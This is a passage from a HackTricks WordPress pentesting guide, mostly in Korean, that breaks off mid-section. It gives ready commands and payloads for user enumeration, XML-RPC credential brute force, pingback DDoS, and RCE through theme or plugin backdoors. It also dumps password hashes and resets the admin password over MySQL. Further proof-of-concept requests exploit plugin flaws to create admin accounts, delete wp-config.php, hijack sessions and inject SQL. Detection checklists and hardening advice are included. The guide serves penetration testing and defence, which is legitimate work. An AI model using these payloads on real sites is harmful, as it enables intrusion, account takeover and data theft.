# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** 파일에서 데이터베이스의 루트 비밀번호를 찾을 수 있습니다.
- 기본 로그인 경로(확인할 것): _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **주요 WordPress 파일**

- `index.php`
- `license.txt`에는 설치된 WordPress 버전 등 유용한 정보가 포함되어 있습니다.
- `wp-activate.php`는 새 WordPress 사이트 설정 시 이메일 활성화 과정에 사용됩니다.
- 로그인 폴더 (숨기기 위해 이름이 변경되었을 수 있음):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`는 HTTP를 전송 메커니즘으로, XML을 인코딩 메커니즘으로 사용해 데이터를 전송할 수 있게 하는 WordPress 기능을 나타내는 파일입니다. 이 유형의 통신은 WordPress의 [REST API](https://developer.wordpress.org/rest-api/reference)로 대체되었습니다.
- `wp-content` 폴더는 플러그인과 테마가 저장되는 주요 디렉토리입니다.
- `wp-content/uploads/` 는 플랫폼에 업로드된 모든 파일이 저장되는 디렉토리입니다.
- `wp-includes/`는 인증서, 글꼴, JavaScript 파일, 위젯 등 핵심 파일이 저장되는 디렉토리입니다.
- `wp-sitemap.xml` WordPress 5.5 이상 버전에서는 공개 포스트와 공개적으로 쿼리 가능한 포스트 타입 및 분류(taxonomies)를 포함한 sitemap XML 파일을 생성합니다.

**Post exploitation**

- `wp-config.php` 파일에는 데이터베이스 이름, 데이터베이스 호스트, 사용자명과 비밀번호, 인증 키 및 솔트, 데이터베이스 테이블 접두사 등 WordPress가 데이터베이스에 연결하는 데 필요한 정보가 들어 있습니다. 이 설정 파일은 또한 문제 해결 시 유용한 DEBUG 모드를 활성화하는 데 사용할 수 있습니다.

### 사용자 권한

- **Administrator**
- **Editor**: 자신의 및 다른 사람의 게시물을 발행하고 관리합니다
- **Author**: 자신의 게시물을 발행하고 관리합니다
- **Contributor**: 작성하고 자신의 게시물을 관리할 수 있으나 게시할 수는 없습니다
- **Subscriber**: 게시물을 열람하고 프로필을 수정합니다

## **수동 열거**

### **WordPress 버전 확인**

파일 `/license.txt` 또는 `/readme.html`을 찾을 수 있는지 확인하세요.

페이지의 **소스 코드** 안에서 (예: [https://wordpress.org/support/article/pages/]):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS 링크 파일

![](<../../images/image (533).png>)

- JavaScript 파일

![](<../../images/image (524).png>)

### 플러그인 가져오기
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 테마 가져오기
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 일반적인 버전 추출
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## 능동적 열거

### 플러그인 및 테마

모든 플러그인 및 테마를 전부 찾을 수는 없을 것입니다. 그들을 모두 발견하려면 **actively Brute Force a list of Plugins and Themes** 해야 합니다 (운 좋게도 이러한 목록을 포함한 자동화 도구들이 있습니다).

### 사용자

- **ID Brute:** WordPress 사이트에서 사용자 ID를 Brute Forcing하여 유효한 사용자를 얻습니다:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
응답이 **200** 또는 **30X**이면 해당 id가 **유효**합니다. 응답이 **400**이면 id가 **무효**입니다.

- **wp-json:** 사용자 정보를 쿼리해 얻어볼 수도 있습니다:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
사용자에 대한 일부 정보를 드러낼 수 있는 또 다른 `/wp-json/` 엔드포인트는:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
이 엔드포인트는 게시물을 작성한 사용자만 노출합니다. **이 기능이 활성화된 사용자에 대한 정보만 제공됩니다**.

또한 **/wp-json/wp/v2/pages**가 IP 주소를 leak할 수 있다는 점에 유의하세요.

- **Login username enumeration**: 로그인 시 **`/wp-login.php`**의 **메시지**가 **서로 다르며** **사용자명 존재 여부**를 나타냅니다.

### XML-RPC

`xml-rpc.php`가 활성화되어 있으면 credentials brute-force를 수행하거나 이를 사용하여 다른 리소스에 DoS 공격을 실행할 수 있습니다. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

활성화 여부를 확인하려면 _**/xmlrpc.php**_에 접근해 다음 요청을 보내보세요:

**확인**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** 또는 **`metaWeblog.getUsersBlogs`** 는 credentials을 brute-force하는 데 사용할 수 있는 몇 가지 메서드입니다. 만약 이들 중 하나를 찾을 수 있다면 다음과 같은 요청을 보낼 수 있습니다:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
자격 증명이 유효하지 않을 경우 200 코드 응답 내에 _"Incorrect username or password"_ 메시지가 표시되어야 합니다.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

올바른 자격 증명을 사용하면 파일을 업로드할 수 있습니다. 응답에 경로가 표시됩니다 ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
또한 같은 요청에서 여러 credentials를 시도할 수 있기 때문에 **`system.multicall`**을 사용해 credentials를 더 빠르게 brute-force할 수 있습니다:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

이 방법은 사람을 위한 것이 아니라 프로그램용으로 오래된 방식이어서 2FA를 지원하지 않습니다. 따라서 유효한 creds가 있지만 메인 진입이 2FA로 보호되어 있다면, **xmlrpc.php를 악용해 해당 creds로 로그인하여 2FA를 우회할 수 있을지도 모릅니다**. 콘솔을 통해 할 수 있는 모든 작업을 수행할 수는 없지만, Ippsec가 [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)에서 설명하는 것처럼 여전히 RCE에 도달할 수 있습니다.

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

값이 **0** (17)보다 큰 **faultCode**를 받으면 포트가 열려 있다는 의미입니다.

이 방법을 악용해 DDoS를 일으키는 방법은 이전 섹션의 **`system.multicall`** 사용 예를 참조하세요.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

이 파일은 일반적으로 Wordpress 사이트의 루트에 존재합니다: **`/wp-cron.php`**\
이 파일에 **접근되면** "**무거운**" MySQL **쿼리**가 수행되므로, 공격자가 이를 이용해 **DoS**를 **유발**할 수 있습니다.\
또한 기본적으로 `wp-cron.php`는 모든 페이지 로드(클라이언트가 Wordpress 페이지를 요청할 때마다)마다 호출되므로, 트래픽이 많은 사이트에서는 문제(DoS)를 일으킬 수 있습니다.

Wp-Cron을 비활성화하고 호스트 내에서 실제 cronjob을 만들어 필요한 작업을 정기적으로 수행하도록 하는 것이 권장됩니다(문제 없이).

### /wp-json/oembed/1.0/proxy - SSRF

다음 URL에 접근을 시도해보세요: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ 그리고 Worpress 사이트가 여러분에게 요청을 보낼 수 있습니다.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

이 도구는 **methodName: pingback.ping**과 경로 **/wp-json/oembed/1.0/proxy**가 있는지 확인하고, 존재하면 이를 악용하려 시도합니다.

## 자동 도구
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## bit를 덮어써서 접근 얻기

실제 공격이라기보다는 호기심에 가까운 사례다. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)에서 임의의 wordpress 파일의 1 bit를 뒤집을 수 있었다. 그래서 파일 `/var/www/html/wp-includes/user.php`의 위치 `5389`를 뒤집어 NOT (`!`) 연산을 NOP로 만들 수 있었다.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**사용 중인 테마의 php 수정 (admin credentials needed)**

Appearance → Theme Editor → 404 Template (오른쪽에 있음)

php shell의 내용으로 변경:

![](<../../images/image (384).png>)

업데이트된 페이지에 어떻게 접근하는지 인터넷에서 찾아보세요. 이 경우에는 여기로 접근해야 합니다: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

다음을 사용할 수 있습니다:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP 플러그인

플러그인으로 .php 파일을 업로드할 수 있을지도 모릅니다.\
예를 들어 다음과 같이 php backdoor를 만드세요:

![](<../../images/image (183).png>)

그런 다음 새 플러그인을 추가합니다:

![](<../../images/image (722).png>)

플러그인을 업로드하고 'Install Now'을 누르세요:

![](<../../images/image (249).png>)

Procced를 클릭하세요:

![](<../../images/image (70).png>)

아마도 눈에 띄는 변화는 없을 수 있지만, Media로 가면 업로드된 shell을 볼 수 있습니다:

![](<../../images/image (462).png>)

접근하면 reverse shell을 실행할 URL을 볼 수 있습니다:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

이 방법은 알려진 취약점이 있는 악성 플러그인을 설치하여 web shell을 얻을 수 있는 방법입니다. 이 과정은 WordPress 대시보드를 통해 다음과 같이 수행됩니다:

1. **Plugin Acquisition**: 플러그인은 Exploit DB와 같은 출처(예: [**here**](https://www.exploit-db.com/exploits/36374))에서 입수합니다.
2. **Plugin Installation**:
- WordPress 대시보드로 이동한 다음 `Dashboard > Plugins > Upload Plugin`으로 갑니다.
- 다운로드한 플러그인의 zip 파일을 업로드합니다.
3. **Plugin Activation**: 플러그인이 성공적으로 설치되면 대시보드를 통해 활성화해야 합니다.
4. **Exploitation**:
- "reflex-gallery" 플러그인이 설치되고 활성화되면 취약점을 이용해 익스플로잇할 수 있습니다.
- Metasploit framework는 이 취약점에 대한 익스플로잇을 제공합니다. 적절한 모듈을 로드하고 특정 명령을 실행하면 meterpreter session을 수립하여 사이트에 대한 무단 접근을 얻을 수 있습니다.
- 이는 WordPress 사이트를 악용하는 여러 방법 중 하나일 뿐입니다.

해당 내용에는 플러그인을 설치하고 활성화하는 WordPress 대시보드 단계의 시각적 설명이 포함되어 있습니다. 그러나 이러한 방식으로 취약점을 악용하는 것은 적절한 허가 없이 불법적이며 비윤리적임을 명심해야 합니다. 이 정보는 책임있게, 명시적인 허가가 있는 pentesting 등 합법적인 맥락에서만 사용해야 합니다.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS에서 RCE로

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_는 WordPress에서 **Cross-Site Scripting (XSS)** 취약점을 **Remote Code Execution (RCE)** 또는 기타 치명적 취약점으로 상승시키기 위해 설계된 스크립트입니다. 자세한 내용은 [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)를 확인하세요. 이 도구는 **Wordpress Versions 6.X.X, 5.X.X and 4.X.X를 지원하며 다음을 허용합니다:** 
- _**Privilege Escalation:**_ WordPress에 사용자를 생성합니다.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ 맞춤 플러그인(backdoor)을 WordPress에 업로드합니다.
- _**(RCE) Built-In Plugin Edit:**_ WordPress의 내장 플러그인을 편집합니다.
- _**(RCE) Built-In Theme Edit:**_ WordPress의 내장 테마를 편집합니다.
- _**(Custom) Custom Exploits:**_ 서드파티 WordPress 플러그인/테마를 위한 맞춤 익스플로잇을 제공합니다.

## Post Exploitation

사용자명과 비밀번호 추출:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
관리자 비밀번호 변경:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress 플러그인 Pentest

### 공격 표면

Wordpress 플러그인이 기능을 어떻게 노출하는지 아는 것은 해당 기능의 취약점을 찾는 데 핵심입니다. 다음 목록에서 플러그인이 기능을 노출할 수 있는 방법과 취약한 플러그인의 몇 가지 예를 [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)에서 확인할 수 있습니다.

- **`wp_ajax`**

플러그인이 사용자에게 기능을 노출하는 방법 중 하나는 AJAX handlers를 통한 것입니다. 이러한 것들은 logic, authorization, 또는 authentication 버그를 포함할 수 있습니다. 또한 이러한 함수들이 인증과 권한을 모두 Wordpress nonce의 존재 여부에 기반하는 경우가 꽤 자주 있으며, 이는 **Wordpress 인스턴스에서 인증된 모든 사용자가 가질 수 있습니다**(역할과 무관하게).

다음은 플러그인에서 함수를 노출하는 데 사용될 수 있는 함수들입니다:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`의 사용은 엔드포인트를 모든 사용자(심지어 인증되지 않은 사용자)도 접근할 수 있게 만듭니다.**

> [!CAUTION]
> 또한, 만약 함수가 단지 `wp_verify_nonce` 함수로 사용자의 권한을 확인하고 있다면, 이 함수는 사용자가 로그인했는지만 확인할 뿐 보통 사용자의 역할(role)은 확인하지 않습니다. 따라서 권한이 낮은 사용자가 권한이 높은 작업에 접근할 수 있습니다.

- **REST API**

또한 `register_rest_route` 함수를 사용해 wordpress에서 함수를 REST API로 등록하여 노출시키는 것도 가능합니다:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`은 해당 사용자가 API 메서드를 호출할 권한이 있는지 검사하는 콜백 함수입니다.

**내장 `__return_true` 함수가 사용되면 사용자 권한 검사를 건너뜁니다.**

- **php 파일에 대한 직접 접근**

물론, Wordpress는 PHP를 사용하며 플러그인 내부의 파일은 웹에서 직접 접근할 수 있습니다. 따라서 플러그인이 파일에 접근하기만 해도 트리거되는 취약한 기능을 노출하고 있다면, 모든 사용자가 이를 악용할 수 있습니다.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

일부 플러그인은 “trusted header” 단축을 내부 통합이나 리버스 프록시용으로 구현한 다음, REST 요청의 현재 사용자 컨텍스트를 설정하기 위해 해당 헤더를 사용합니다. 그 헤더가 업스트림 컴포넌트에 의해 요청과 암호학적으로 결속되어 있지 않으면, 공격자는 이를 스푸핑하여 관리자 권한으로 특권 REST 라우트에 접근할 수 있습니다.

- 영향: core users REST route를 통해 새 관리자 계정을 생성하여 인증 없이 관리자 권한으로 권한 상승.
- 예시 헤더: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1을 강제로 지정 — 일반적으로 첫 번째 관리자 계정).
- 악용된 라우트: `POST /wp-json/wp/v2/users` (권한이 상승된 역할 배열과 함께).

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
왜 작동하는가

- 플러그인이 클라이언트가 제어하는 헤더를 인증 상태로 매핑하고 권한 검사를 건너뛴다.
- WordPress 코어는 이 라우트에 대해 `create_users` 권한을 기대한다; 플러그인 해킹은 헤더에서 직접 현재 사용자 컨텍스트를 설정해 이를 우회한다.

예상 성공 지표

- 생성된 사용자를 설명하는 JSON 본문과 함께 HTTP 201.
- `wp-admin/users.php`에 표시되는 새로운 관리자 사용자.

탐지 체크리스트

- `getallheaders()`, `$_SERVER['HTTP_...']` 또는 사용자 정의 헤더를 읽어 사용자 컨텍스트를 설정하는 vendor SDKs를 grep한다(예: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- 견고한 `permission_callback` 검사를 갖추지 못하고 대신 요청 헤더에 의존하는 권한 있는 콜백에 대한 REST 등록을 검토한다.
- REST 핸들러 내부에서 헤더 값으로만 제한되는 핵심 사용자 관리 함수(`wp_insert_user`, `wp_create_user`)의 사용을 찾아라.

### wp_ajax_nopriv을 통한 인증되지 않은 임의의 파일 삭제 (Litho Theme <= 3.0)

WordPress 테마와 플러그인은 종종 `wp_ajax_` 및 `wp_ajax_nopriv_` 훅을 통해 AJAX 핸들러를 노출한다. **_nopriv_** 변형이 사용될 때 **콜백이 인증되지 않은 방문자에게 도달 가능해지므로**, 모든 민감한 동작은 추가로 다음을 구현해야 한다:

1. **권한 확인**(예: `current_user_can()` 또는 최소한 `is_user_logged_in()`), 그리고
2. `check_ajax_referer()` / `wp_verify_nonce()`로 검증되는 **CSRF nonce**, 그리고
3. **엄격한 입력 정제 / 검증**.

Litho 멀티퍼포즈 테마 (< 3.1)는 *Remove Font Family* 기능에서 이 세 가지 제어를 누락했고, 결국 다음 코드를 포함하여 배포되었다(단순화됨):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
이 스니펫으로 인해 발생하는 문제:

* **Unauthenticated access** – `wp_ajax_nopriv_` 훅이 등록되어 있습니다.
* **No nonce / capability check** – 모든 방문자가 해당 엔드포인트에 접근할 수 있습니다.
* **No path sanitisation** – 사용자 제어 `fontfamily` 문자열이 필터링 없이 파일 시스템 경로에 이어붙여져 전형적인 `../../` traversal을 허용합니다.

#### 악용

공격자는 단 한 번의 HTTP POST 요청으로 **uploads base directory 아래**(보통 `<wp-root>/wp-content/uploads/`)의 임의 파일이나 디렉터리를 삭제할 수 있습니다:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### 탐지 체크리스트

* 파일 시스템 헬퍼(`copy()`, `unlink()`, `$wp_filesystem->delete()` 등)를 호출하는 모든 `add_action( 'wp_ajax_nopriv_...')` 콜백.
* 경로에 비검증 사용자 입력을 이어붙이는 경우(`$_POST`, `$_GET`, `$_REQUEST`를 확인).
* `check_ajax_referer()` 및 `current_user_can()`/`is_user_logged_in()`의 부재.

---

### 오래된 역할 복원 및 인증 누락을 통한 권한 상승 (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
왜 취약한가

- 서버 측 권한 검증 없이 `$_REQUEST['reset-for']`와 플러그인 옵션을 신뢰한다.
- 사용자가 이전에 더 높은 권한을 `_asenha_view_admin_as_original_roles`에 저장해 두었고 이후 권한이 낮아진 경우, reset 경로에 접근해 이를 복원할 수 있다.
- 일부 배포에서는, 인증된 어떤 사용자도 `viewing_admin_as_role_are`에 여전히 남아 있는 다른 사용자명을 대상으로 리셋을 트리거할 수 있다(권한 검증 결함).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- user meta에 'original roles'를 영구 저장하는 역할 전환 기능을 찾아보세요(예: `_asenha_view_admin_as_original_roles`).
- 다음과 같은 리셋/복원 경로를 식별하세요:
  - `$_REQUEST` / `$_GET` / `$_POST`에서 사용자명을 읽는지.
  - `add_role()` / `remove_role()`로 역할을 변경하면서 `current_user_can()`와 `wp_verify_nonce()` / `check_admin_referer()` 없이 동작하는지.
  - 행위자의 권한(capabilities) 대신 플러그인 옵션 배열(예: `viewing_admin_as_role_are`)에 기반해 권한을 부여하는지.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
왜 취약한가

- 공개된 `init` 훅으로 핸들러가 인증되지 않은 사용자도 접근할 수 있습니다 (`is_user_logged_in()` 보호 없음).
- 신원은 클라이언트에서 수정 가능한 쿠키(`original_user_id`)로부터 파생됩니다.
- `wp_set_auth_cookie($uid)`를 직접 호출하면 권한 또는 nonce 검사 없이 요청자를 해당 사용자로 로그인시킵니다.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

공격 노트

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

방어 노트

- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **only install trustable WordPress plugins and themes**.

### 보안 플러그인

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **기타 권장사항**

- 기본 **admin** 사용자 제거
- **강력한 비밀번호**와 **2FA** 사용
- 주기적으로 사용자 **권한**을 **검토**하세요
- Brute Force 공격을 방지하기 위해 **로그인 시도 제한** 적용
- **`wp-admin.php`** 파일 이름을 변경하고 내부 또는 특정 IP에서만 접근 허용


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** – no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. 새로운 nonce를 가져옵니다:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`를 악용해 임의의 SQL을 주입합니다:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
응답은 주입된 쿼리의 결과를 노출하거나 데이터베이스를 변경하여 SQLi를 입증합니다.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
